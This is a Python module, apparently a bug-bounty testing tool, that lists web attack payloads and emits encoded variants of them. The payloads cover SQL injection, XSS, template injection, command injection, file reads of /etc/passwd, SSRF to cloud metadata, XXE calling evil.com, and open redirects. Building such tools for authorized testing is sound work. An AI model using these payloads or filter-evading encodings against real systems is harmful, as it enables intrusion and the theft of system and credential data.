"""Payload 工厂 — 多类型 + 多编码变体生成"""

import base64
import urllib.parse
from typing import Optional


# 原始 Payload
PAYLOAD_TEMPLATES = {
    "sqli": [
        "' OR 1=1 -- ",
        "' UNION SELECT NULL -- ",
        "' AND SLEEP(5) -- ",
        "1' AND 1=1 -- ",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
    ],
    "cmdi": [
        "; id",
        "| id",
        "&& id",
        "$(whoami)",
        "`whoami`",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "ssrf": [
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]><root>&xxe;</root>',
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "//evil.com%2f@",
    ],
    "idor": [
        "1",
        "0",
        "-1",
        "999999",
    ],
}


# 编码函数
def encode_url(text: str) -> str:
    return urllib.parse.quote(text)


def encode_double_url(text: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(text))


def encode_base64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def encode_hex(text: str) -> str:
    return text.encode().hex()


def encode_unicode(text: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in text)


def encode_html(text: str) -> str:
    return "".join(f"&#{ord(c)};" for c in text)


ENCODERS = {
    "raw": lambda t: t,
    "url": encode_url,
    "double_url": encode_double_url,
    "base64": encode_base64,
    "hex": encode_hex,
    "unicode": encode_unicode,
}


async def bb_payload(
    vuln_type: str = "xss",
    encode: str = "raw",
    count: int = 10,
) -> str:
    """
    Payload 生成 — 按漏洞类型生成含多种编码变体的 Payload 列表

    Args:
        vuln_type: 漏洞类型 (sqli/xss/ssti/cmdi/lfi/ssrf/xxe/open_redirect/idor)
        encode: 编码方式 (raw/url/double_url/base64/hex/unicode/all)
        count: 生成数量上限（默认 10）

    Returns:
        Payload 列表
    """
    vuln_type = vuln_type.lower()
    if vuln_type not in PAYLOAD_TEMPLATES:
        types = ", ".join(PAYLOAD_TEMPLATES.keys())
        return f"[!] 不支持的漏洞类型: {vuln_type}\n支持的: {types}"

    templates = PAYLOAD_TEMPLATES[vuln_type]

    # 编码方式
    if encode == "all":
        encoders_to_use = list(ENCODERS.values())
    elif encode in ENCODERS:
        encoders_to_use = [ENCODERS[encode]]
    else:
        encoders_to_use = [ENCODERS["raw"]]

    result = []
    result.append(f"[*] Payload 生成 — 类型: {vuln_type} | 编码: {encode}")
    result.append("")

    payloads = []
    for template in templates:
        for enc_fn in encoders_to_use:
            try:
                encoded = enc_fn(template)
                if encoded != template:
                    payloads.append(f"{encoded:100} [# raw: {template[:50]}]")
                else:
                    payloads.append(encoded)
            except Exception:
                continue

    # 去重
    seen = set()
    unique_payloads = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    # 限制数量
    display = unique_payloads[:count]

    result.append(f"[*] 生成 {len(unique_payloads)} 个 Payload，显示前 {len(display)} 个:")
    result.append("")
    for i, p in enumerate(display, 1):
        result.append(f"  {i:3}. {p}")

    result.append("")
    if len(unique_payloads) > count:
        result.append(f"[... 还有 {len(unique_payloads) - count} 个未显示]")

    # 使用建议
    result.append("")
    result.append("[*] 编码说明:")
    result.append("  raw        → 原始 Payload")
    result.append("  url        → URL 编码")
    result.append("  double_url → 双重 URL 编码")
    result.append("  base64     → Base64 编码")
    result.append("  hex        → 十六进制编码")
    result.append("  unicode    → Unicode 编码")
    result.append("  all        → 全部编码方式")

    return "\n".join(result)
